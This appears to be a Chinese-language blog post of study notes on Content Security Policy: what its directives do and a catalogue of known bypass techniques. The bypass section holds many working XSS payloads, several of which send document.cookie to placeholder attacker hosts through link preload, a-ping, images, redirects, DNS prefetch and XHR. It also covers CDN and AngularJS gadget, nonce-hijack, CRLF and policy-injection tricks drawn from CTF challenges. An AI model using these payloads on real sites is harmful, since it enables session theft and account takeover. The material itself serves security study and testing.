---
title: CSP & Bypass
date: April 30th 2020
tags: [Web安全, CSP, Bypass, XSS]
summary: 内容安全策略（CSP）原理与绕过技巧全面总结，整理各类 CSP 配置缺陷对应的 Bypass 方法，助力 XSS 防御绕过研究。
---

# CSP & Bypass

这部分是从其他师傅们的文章里摘抄的笔记与一些其他内容的总结，以便学习与复习。

## 什么是CSP？

Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。

[https://www.w3.org/TR/CSP3/](https://www.w3.org/TR/CSP3/#directive-font-src)

## 支持CSP的浏览器

CSP主要有三个header，分别是：Content-Security-Policy，X-Content-Security-Policy，X-WebKit-CSP

- Content-Security-Policychrome 25+，Firefox 23+，Opera 19+
- X-Content-Security-PolicyFirefox 23+，IE10+
- X-WebKit-CSPChrome 25+

## CSP的来源

常见的CSP：

```plain
header("Content-Security-Policy:default-src 'none'; connect-src 'self'; frame-src 'self'; script-src xxxx/js/ 'sha256-KcMxZjpVxhUhzZiwuZ82bc0vAhYbUJsxyCXODP5ulto=' 'sha256-u++5+hMvnsKeoBWohJxxO3U9yHQHZU+2damUA6wnikQ=' 'sha256-zArnh0kTjtEOVDnamfOrI8qSpoiZbXttc6LzqNno8MM=' 'sha256-3PB3EBmojhuJg8mStgxkyy3OEJYJ73ruOF7nRScYnxk=' 'sha256-bk9UfcsBy+DUFULLU6uX/sJa0q7O7B8Aal2VVl43aDs=';font-src xxxx/fonts/ fonts.gstatic.com; style-src xxxx/css/ fonts.googleapis.com; img-src 'self'");
```

1. none代表什么都不匹配，self代表匹配同源的内容；
2. https://example.com/path/to/file.js这样的会匹配特殊的文件，https://example.com/这样会匹配源下的所有文件；
3. https:，会匹配所有包含这个特殊的格式的来源；
4. example.com会匹配所有这个host的来源，*.example.com,会匹配这个host的所有子域；
5. nonce-qwertyu12345会匹配一个特殊的节点。；
6. 还有加密过的类似于sha256-abcd…同样会匹配页面中一个特殊的节点（每次修改这个值都会改变）

## CSP的属性

### child-src

`child-src`指令管理了套嵌浏览的部分（类似于iframe、frame标签）。

### connect-src

`connect-src`指令限制了可使用的脚本加载的url，会阻止a的ping属性，也控制着websocket的连接。script标签里面的数据发送由这个属性限制。

### default-src

属性的默认值，如果没有指定值，则默认为`default-src`所设定的值。

### font-src

`font-src`指令限制了所有可以被加载的字体资源。

### img-src

`img-src`指令限制着所有可以加载的图片资源的来源。

### manifest-src

`manifest-src`指令限制了从应用清单可以加载的url。常见的就是link标签

`<link rel="manifest" href="[https://not-example.com/manifest](https://not-example.com/manifest)">`

### media-src

`media-src`指令限制令额所有从视频、音频、和相关的文本来源。针对`audio` `video`以及连带的文本。

### object-src

`object-src`限制了所有从插件加载的来源。例如`embed`、`object`、`applet`等。

### script-src

script-src指令限制了所有js脚本可以被执行的地方，不仅仅是包括通过链接方式加载的脚本url，同样包括所有内联脚本，甚至包括各种方式的引用。

- 参数unsafe-inline：不会阻止内联脚本
- 参数unsafe-eval：会允许下面的几个函数

```plain
eval()
Function()
setTimeout() with an initial argument which is not callable.
setInterval() with an initial argument which is not callable.
```

### style-src

style-src指令限制了所有可能被引用的css，包括下面三种引用的css属性，style也有个`unsafe-inline`这个参数。

- 通过link标签加载的css
- style标签
- 通过@import引入的样式表
- 内联样式表 ：style="font-size:10px;font-color:#ff0000"

## 数据

- data: 允许data:URI作为内容来源
- mediastream: 允许mediastream: URI作为内容来源

`Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream:`

## Bypass

### xxx-src *

类似于src引用的方式 ⇒ CSRF

### script-src unsafe-inline

不能从外部引入，但是可以直接内嵌：

```plain
<script>alert(1)</script>
```

文章中有一个案例：一个聊天框系统，由于系统还设置了同源策略，不能将cookie发送到别的域下。但是可以同js调用发送消息的接口来获取别人的cookie。

```plain
<script>var xmlhttp=new XMLHttpRequest();
xmlhttp.open("POST","submit.php",true);
xmlhttp.setRequestHeader(_Ctent-type_,_applicati/x-www-form-urlencoded_);
xmlhttp.send(_to=lorexxar&&message=_+document.cookie);</script>;
```

### xxx-src self

只允许同源的url，但是link标签比较例外，在chrome当中还没有被CSP所限制。可以导致CSRF漏洞。

```plain
<link rel="prefetch" herf="xxxxxxx">
```

- 预加载导致的绕过

具体可以参考：[https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html](https://www.cnblogs.com/iamstudy/articles/bypass_csp_study.html)

```plain
<!-- 预加载某个页面 -->
<link rel='prefetch' href='http://xxxx'><!-- firefox -->
<link rel='prerender' href='http://xxxx'><!-- chrome -->
<!-- 预加载某个图片 -->
<link rel='prefetch' href='http://xxxx/x.jpg'>
<!-- DNS 预解析 -->
<link rel="dns-prefetch" href="http://xxxx">
<!-- 特定文件类型预加载 -->
<link rel='preload' href='//xxxxx/xx.js'><!-- chrome -->
```

chrome还没对预加载进行处理，firefox有进行处理，prefetch已不可用，但是dns预解析还是能用的。

在unsafe-inline的情況下，利用的payload如下：

Chrome Http通道

```plain
var n0t = document.createElement("link");n0t.setAttribute("rel", "preload");n0t.setAttribute("href", "//ipipipip/"+escape((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+escape((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})()));document.head.appendChild(n0t);
```

Firefox(dns通道)

```plain
dc = document.cookie;dcl = dc.split(";");n0 = document.getElementsByTagName("HEAD")[0];for (var i=0; i<dcl.length;i++){console.log(dcl[i]);n0.innerHTML = n0.innerHTML + "<link rel=\"preconnect\" href=\"//" + escape(dcl[i].replace(/\//g, "-")).replace(/%/g, "_") + '.' + location.hostname.split(".").join("") +  ".xxx.io\">";}
```

当资源类型是以下几种情况时，预加载操作不会执行：

```plain
URL中包含下载资源
页面中包含音频、视频
POST、PUT和DELET操作的ajax请求
HTTP认证
HTTPS页面
含恶意软件的页面
弹窗页面
占用资源很多的页面
打开了chrome developer tools开发工具
```

- jQuery sourcemap

```plain
document.write(`<script>
//@ 	   sourceMappingURL=http://xxxx/`+document.cookie+`<\/script>`);
```

- a标签的ping属性

```plain
a=document.createElement('a');
a.href='#';
a.ping='http://xxx.io/?' + escape(document.cookie);
a.click();
```

- http 204

```plain
location='//xxx.io/csi?' + escape(document.cookie);
```

- script包含的js进行绕过（通用的bypass方式）

```plain
<script>
window.location="http://www.xss.com/x.php?c=[cookie]";
</script>
```

```plain
var a=document.createElement("a");
a.href='http://www.xss.com/?c='+escape(document.cookie);
a.click();
```

```plain
var i=document.createElement("img");
i.src='http://www.xss.com/?c='+escape(document.cookie);
xxx.appendChild(i);
```

- 重定向(302)导致绕过

```plain
Content-Security-Policy: default-src 'self';script-src http://127.0.0.1/a/ ;
```

如果能找到一个url跳转，通过`/a/`目录下跳转到其他目录下读取文件，即可绕过。

- 文件上传导致的Bypass

当上传的文件处于csp所规定的目录下时，apache和nginx会有不同的解析方式。

apache：在一个未知后缀名并且不指定content-type的情况下，会默认以html解析。

nginx：不指定后缀名的情况下，会直接写下载。可以尝试上传`<svg>`格式的xss payload。

`<svg xmlns="[http://www.w3.org/2000/svg&quot;](http://www.w3.org/2000/svg&quot;) onload="alert(URL)"/>`

如果能够直接上传一个jpg图片，我们可以通过下面的payload进行调用：

`<embed src="[http://127.0.0.1/upload/1.jpg](http://127.0.0.1/upload/1.jpg&quot;)" type="application/x-shockwave-flash"></embed>`

参考：[https://xz.aliyun.com/t/318/](https://xz.aliyun.com/t/318/)

### Iframe包含导致的绕过

同源站点中，如果index.php没有作过滤，而csp.php有过滤的话，可以用index.php页面创建一个iframe，直接操作iframe的dom进行绕过。

```plain
<script>
var iframe = document.createElement('iframe');
iframe.src="./safe.php";
document.body.appendChild(iframe);
setTimeout(()=>location.href='http://xxx/cookie/'+escape(document.cookie),1000);
</script>
```

### CRLF导致的bypass

当通过CRLF传入%0d%0a%0d%0a，可以使HTTP头部中的csp规则变成网页内容而被忽视。(PHP高版本中不允许发送多行Header)

HCTF2018_Bottle：[https://github.com/Lou00/HCTF2018_Bottle](https://github.com/Lou00/HCTF2018_Bottle)

### Base-uri绕过

```plain
default-src 'self'; script-src 'nonce-test'

default没有额外设置base-uri
```

使用base标签将页面中的地址设置为自己的vps，script使用的相对路径，可以进行绕过利用。

### CDN绕过

当规则中包含了某一个CDN服务器，并且服务器上存在低版本的框架，则可以利用框架所存在的漏洞进行xss来绕过csp。

参考：[https://paper.seebug.org/855/](https://paper.seebug.org/855/)

```plain
<!-- foo="-->
<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js>
</script>
<div ng-app>
    {{constructor.constructor('alert(document.cookie)')()}}
</div>
//sssss" -->
```

存在低版本angular js的CDN服务商列表：

[https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76](https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76)

其他的库：

Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”：

```plain
<div data-role=popup id='<script>alert(1)</script>'></div>
```

[https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

### 利用浏览器补全

有些网站限制只有某些脚本才能使用，往往会使用`<script>`标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样：

```plain
Content-Security-Policy: default-src 'none';script-src 'nonce-abc'
```

那么当脚本插入点为如下的情况时:

```plain
<p>插入点</p>
<script id="aa" nonce="abc">document.write('CSP');</script>
```

可以插入:

```plain
<script src=//14.rs a="
```

这样会拼成一个新的script标签，其中的src可以自由设定

```plain
<p><script src=//14.rs a="</p>
<script id="aa" nonce="abc">document.write('CSP');</script>
```

### 本地文件包含导致绕过

当csp都是self时，可以通过上传本地文件，然后进行包含。

- cctf 2016

通过后台上传了一个swf。(但是这里我一直没有复现成功，可能是浏览器版本的缘故。)

```plain
CWS
<script>var xml = new XMLHttpRequest(); xml.open('POST', 'http://xss.xxxxx.cc', true); xml.setRequestHeader("Content-type","application/x-www-form-urlencoded"); xml.send('cookie='+document.cookie); </script>
```

```plain
<link rel='import' href='/upload/xxxxx'>
```

hctf 2016：

题目csp限制只能在static加载js，把文件上传到upload目录，通过%2f跨目录加载。

```plain
<scscriptript src="http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"></scscriptript>
```

### CSP注入导致的绕过

当CSP中的内容是可控的内容时，可以通过下面两种方式绕过：

- 破坏CSP的方法（Edge浏览器）

```plain
CSP: script-src 'none'; report-uri /test;_
```

`test;_`是能够控制的内容。当CSP语句被破坏时，Edge浏览器会放弃整个CSP策略。

文章中给了一个很短的payload：`;_`

实例地址：[http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E%5D(http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E))

- script-src-elem重写规则绕过

例子：

```plain
Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'

<script>alert("This will be blocked")</script>
<a href="#" onclick="alert('This will be allowed')">test</a>
```

实例地址：[script-src-elem重写规则绕过](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;script-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

## 参考：

- CSP Level 3浅析&简单的bypass
- Bypassing CSP with policy injection
- csp学习
- 初探CSPBypass一些细节总结
- csp绕过姿势

两个方便CSP测试的网址：

- CSP生成：https://www.cspisawesome.com/
- CSP分析：https://csp-evaluator.withgoogle.com/

总结是永远总结不完的，这里只贴地址了：

- 如何将JavaScript隐藏在PNG图像中来绕过CSP
- CSP:trusted-types 初体验